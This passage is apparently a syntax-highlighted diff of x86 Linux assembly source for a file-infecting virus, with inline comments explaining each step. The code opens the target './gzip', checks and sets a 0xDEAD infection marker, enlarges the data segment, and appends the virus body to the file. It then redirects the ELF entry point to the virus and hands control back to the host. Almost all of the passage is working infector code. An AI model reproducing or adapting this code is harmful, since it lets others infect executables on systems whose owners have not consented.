+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; copy us in the data section</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ebx</span><span style="color: #339933;">,</span><span style="color: #ff0000;">01h</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lea</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>texto<span style="color: black;">&#93;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0Ch</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; Show a Hello World with a </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span> &nbsp; &nbsp;sys_write &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; write to stdout</span><br/>
+&nbsp; &nbsp; <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">05</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lea</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ebx</span><span style="color: #339933;">,</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>archivo<span style="color: black;">&#93;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; open file to infect (./gzip)</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span><span style="color: #ff0000;">02</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; read/write</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">80h</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ebx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; Handle in EBX</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">xor</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ecx</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">xor</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">edx</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; Go to beginning of file</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span> &nbsp; &nbsp;sys_lseek<br/>
+&nbsp; &nbsp; &nbsp; &nbsp;<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lea</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>Elf_header<span style="color: black;">&#93;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; Read the ELF header to our</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: #339933;">,</span><span style="color: #ff0000;">24h</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; variable</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span> &nbsp; &nbsp;sys_read<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cmp</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">word</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>Elf_header<span style="color: #339933;">+</span><span style="color: #ff0000;">8</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0xDEAD</span> &nbsp;<span style="color: black; font-style: italic;">; Check for previous infection</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jne</span> &nbsp; &nbsp; infectar<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jmp</span> &nbsp; &nbsp; salir<br/>
+infectar<span style="color: #339933;">:</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">word</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>Elf_header<span style="color: #339933;">+</span><span style="color: #ff0000;">8</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0xDEAD</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; The mark is on the 2 first</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; fill bytes in the ident struc</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>e_phoff<span style="color: black;">&#93;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; e_phoff is a ptr to the PH</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span><span style="color: #ff0000;">8</span><span style="color: #339933;">*</span><span style="color: #ff0000;">4</span><span style="color: #339933;">*</span><span style="color: #ff0000;">3</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; Obtain 3rd entry of data seg</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> &nbsp; &nbsp;<span style="color: #46aa03; font-weight: bold;">ecx</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">xor</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">edx</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span> &nbsp; &nbsp;sys_lseek &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; Go to that position</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lea</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>Program_header<span style="color: black;">&#93;</span> &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; Read the entry</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: #339933;">,</span><span style="color: #ff0000;">8</span><span style="color: #339933;">*</span><span style="color: #ff0000;">4</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span> &nbsp; &nbsp;sys_read<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dword</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>p_filez<span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0x2000</span> &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; increase segment size in</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dword</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>p_memez<span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0x2000</span> &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; memory and in the file</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
+<span style="color: black; font-style: italic;">; The size to add must be superior to the size of the virus, because besides</span><br/>
+<span style="color: black; font-style: italic;">; copy the virus, we have also to copy the section table, located before</span><br/>
+<span style="color: black; font-style: italic;">; and it is not mapped into mem by default. It could be shifted (for avoid</span><br/>
+<span style="color: black; font-style: italic;">; copying it) but for simplycity reasons i don't do that.</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ecx</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">xor</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">edx</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span> &nbsp; &nbsp;sys_lseek &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; back to entry position</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lea</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>Program_header<span style="color: black;">&#93;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: #339933;">,</span><span style="color: #ff0000;">8</span><span style="color: #339933;">*</span><span style="color: #ff0000;">4</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span> &nbsp; &nbsp;sys_write &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; Write entry to the file</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">xor</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ecx</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: #339933;">,</span><span style="color: #ff0000;">02h</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span> &nbsp; &nbsp;sys_lseek &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; Go to file end</span><br/>
+<br/>
+<span style="color: black; font-style: italic;">; EAX = File Size, that will be phisical offset of the virus</span><br/>
+&nbsp; &nbsp; &nbsp;<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">dword</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>oldentry<span style="color: black;">&#93;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dword</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>temp<span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ecx</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">dword</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>e_entry<span style="color: black;">&#93;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dword</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>oldentry<span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ecx</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">sub</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">dword</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>p_offset<span style="color: black;">&#93;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dword</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>p_vaddr<span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">dword</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>p_vaddr<span style="color: black;">&#93;</span> &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; EAX = New entrypoint</span><br/>
+&nbsp; &nbsp; <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dword</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>e_entry<span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp;<br/>
+<span style="color: black; font-style: italic;">; These are the calculations of the new entry address, that will point to the</span><br/>
+<span style="color: black; font-style: italic;">; code of the virus. For calculate the virtual address of the virus in memory</span><br/>
+<span style="color: black; font-style: italic;">; i move the pointer to the end of the file with lseek, so the EAX register</span><br/>
+<span style="color: black; font-style: italic;">; will have the phisical size of the file (i.e. the physical position of the</span><br/>
+<span style="color: black; font-style: italic;">; virus in the file).</span><br/>
+<span style="color: black; font-style: italic;">; If to that position i substract the physical position of the beginning of</span><br/>
+<span style="color: black; font-style: italic;">; the data segment, i will have the virus position relative to the beginning</span><br/>
+<span style="color: black; font-style: italic;">; of the data segment, and if i add to it the virtual address of the segment</span><br/>
+<span style="color: black; font-style: italic;">; i will obtain the virtual address of the virus in memory.</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lea</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>main<span style="color: black;">&#93;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: #339933;">,</span>virend<span style="color: #339933;">-</span>main<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span> &nbsp; &nbsp;sys_write &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; Write the virus to the end</span><br/>
+<br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">xor</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ecx</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">xor</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">edx</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span> &nbsp; &nbsp;sys_lseek &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; Set pointer to beginning of</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; the file</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lea</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>Elf_header<span style="color: black;">&#93;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: #339933;">,</span><span style="color: #ff0000;">24h</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span> &nbsp; &nbsp;sys_write &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; Modify header with new EIP</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">dword</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>temp<span style="color: black;">&#93;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dword</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>oldentry<span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ecx</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br/>
+salir<span style="color: #339933;">:</span> &nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">06</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; Close the file</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">80h</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">popa</span><br/>
+&nbsp;<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span> &nbsp; &nbsp; &nbsp;<span style="color: #ff0000;">068h</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; Opcode of a PUSH</span><br/>
+oldentry<span style="color: #339933;">:</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dd</span> &nbsp; &nbsp; &nbsp;hoste &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; back to infected program</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <br/>
+sys_read<span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; EBX = Must be File Handle</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">3</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">80h</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span><br/>
+sys_write<span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; EBX = Must be File Handle</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">4</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">80h</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span><br/>
+sys_lseek<span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; EBX = Must be File Handle</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">19</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">80h</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span><br/>
+<br/>
+dir &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dd</span> &nbsp; &nbsp; &nbsp;main<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dw</span> &nbsp; &nbsp; &nbsp;<span style="color: #ff0000;">010h</span> <br/>
+archivo <span style="color: #0000ff; font-weight: bold;">db</span> &nbsp; &nbsp; &nbsp;<span style="color: #7f007f;">&quot;./gzip&quot;</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; File to infect</span><br/>
+datos &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span> &nbsp; &nbsp; &nbsp;<span style="color: #ff0000;">00h</span> &nbsp;<br/>
+<br/>
+temp &nbsp; &nbsp;<span style="color: #0000ff; font-weight: bold;">dd</span> &nbsp; &nbsp; &nbsp;<span style="color: #ff0000;">00h</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; Save oldentry temporally</span><br/>
+<br/>
+<span style="color: black; font-style: italic;">;**************** Data Zone *************************************************</span><br/>
+<br/>
+newentry &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #0000ff; font-weight: bold;">dd</span> <span style="color: #ff0000;">00h</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; New virii EIP</span><br/>
+newfentry &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dd</span> <span style="color: #ff0000;">00h</span><br/>
+myvaddr &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dd</span> <span style="color: #ff0000;">00h</span><br/>
